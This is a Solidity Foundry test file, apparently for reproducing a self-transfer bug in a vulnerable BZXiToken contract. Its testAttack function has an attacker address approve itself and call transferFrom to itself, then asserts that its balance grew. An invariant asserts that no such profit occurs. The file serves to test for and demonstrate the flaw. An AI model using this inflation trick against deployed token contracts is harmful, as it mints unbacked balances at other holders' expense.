// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../BZXiToken.sol";

contract BZXiTokenTest is Test {
    address owner;
    address attacker;
    BZXiToken bzxitoken;

    uint256 constant initialBalance = 10 ether;
    uint256 constant hackAmount = 1 ether;
    uint256 constant requiredBalance = initialBalance + hackAmount;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);

        bzxitoken = new BZXiToken();
        bzxitoken.transfer(attacker, initialBalance);
    }

    function testAttack() external {
        vm.startPrank(attacker);
        bzxitoken.approve(attacker, hackAmount);
        bzxitoken.transferFrom(attacker, attacker, hackAmount);

        assertGe(bzxitoken.balanceOf(attacker), requiredBalance);
    }

    function invariantNoProfit() external {
        assertLt(bzxitoken.balanceOf(attacker), requiredBalance);
    }
}
